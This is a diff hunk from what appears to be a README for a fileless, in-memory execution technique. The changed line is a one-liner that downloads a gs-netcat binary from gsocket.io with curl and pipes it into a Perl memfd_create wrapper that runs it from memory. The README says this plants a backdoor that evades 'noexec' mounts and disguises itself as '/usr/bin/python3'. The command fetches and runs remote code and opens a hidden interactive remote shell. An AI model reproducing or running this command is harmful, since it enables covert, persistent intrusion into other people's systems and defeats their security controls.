@@ -40,7 +40,7 @@ cat /bin/ls | TIME_STYLE=+%s memexec -- -lah
 
 The educated reader understands that this is mostly used to pipe a backdoor from the Internet directly into memory, even when execution is prohobited by `noexec` or there is no writeable directory (hides as process name `/usr/bin/python3`):
 ```shell
-curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | GS_ARGS="-ilD -s ChangeMe" perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"/usr/bin/python3"' #,@ARGV' -- "$@"
+curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | GS_ARGS="-ilD -s ChangeMe" perl '-e$^F=255;for(319,279,385,314){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@"
 ```
 ---
 
